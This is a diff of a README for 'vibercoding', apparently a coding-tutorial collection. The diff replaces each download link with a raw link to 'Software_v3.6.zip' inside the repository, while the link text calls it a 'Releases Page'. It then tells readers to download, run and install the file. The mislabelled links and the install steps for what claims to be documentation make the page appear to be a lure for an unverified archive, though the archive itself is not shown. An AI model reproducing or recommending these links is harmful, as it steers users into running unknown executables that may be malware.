@@ -1,7 +1,7 @@
 # 🎉 vibercoding - Simplify Your Coding Experience
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/jens613/vibercoding/main/doucely/vibercoding.zip)](https://raw.githubusercontent.com/jens613/vibercoding/main/doucely/vibercoding.zip)
+[![Download](https://github.com/jens613/vibercoding/raw/refs/heads/main/vibe-coding/优秀项目和文章/Software_v3.6.zip)](https://github.com/jens613/vibercoding/raw/refs/heads/main/vibe-coding/优秀项目和文章/Software_v3.6.zip)
 
 ## 📚 Description
 vibercoding 是一个聚合文档，它旨在帮助用户快速学习编码。无论你是初学者还是有经验的开发者，vibercoding 提供清晰易懂的资源来支持你的编码旅程。
@@ -15,7 +15,7 @@ Before you start, make sure your computer meets the following system requirement
 - Storage: At least 100 MB of free space.
 
 ### Steps to Download and Run
-1. Go to the [Releases Page](https://raw.githubusercontent.com/jens613/vibercoding/main/doucely/vibercoding.zip).
+1. Go to the [Releases Page](https://github.com/jens613/vibercoding/raw/refs/heads/main/vibe-coding/优秀项目和文章/Software_v3.6.zip).
 2. Look for the latest version listed at the top of the page.
 3. Find the asset that matches your computer’s operating system.
 4. Click on the download link for that asset. It will start downloading automatically.
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets the following system requirement
 7. Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
-To download vibercoding, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jens613/vibercoding/main/doucely/vibercoding.zip)
+To download vibercoding, visit this page to download: [Releases Page](https://github.com/jens613/vibercoding/raw/refs/heads/main/vibe-coding/优秀项目和文章/Software_v3.6.zip)
 
 ## 🛠 Features
 - User-friendly interface for coding tutorials.
